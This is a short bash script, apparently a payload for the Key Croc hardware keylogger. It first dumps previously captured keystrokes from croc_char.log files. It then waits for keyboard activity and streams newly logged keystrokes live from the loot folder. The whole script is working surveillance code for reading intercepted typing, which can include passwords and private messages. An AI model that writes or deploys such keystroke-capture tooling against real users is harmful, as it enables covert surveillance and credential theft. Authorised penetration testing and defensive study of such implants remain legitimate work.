#!/bin/bash

# Title:           Croc_Live
# Description:     Live keystrokes in real-time. It operates in the terminal environment ( bash udisk/tools/croc_live.sh )
# Author:          spywill
# Version:         1.0
# Category:        Key Croc

echo -ne "\n\nPrevious keystrokes:\n\n"
find . -type f -name "croc_char.log" -exec cat {} +

until [ -f loot/croc_char.log ]; do
	echo -ne "Waiting for keyboard activity\033[0K\r"
done
sleep 1
printf '\033[H\033[2J'

echo -ne "\n\nLive keystrokes:\n\n"
tail -f loot/croc_char.log
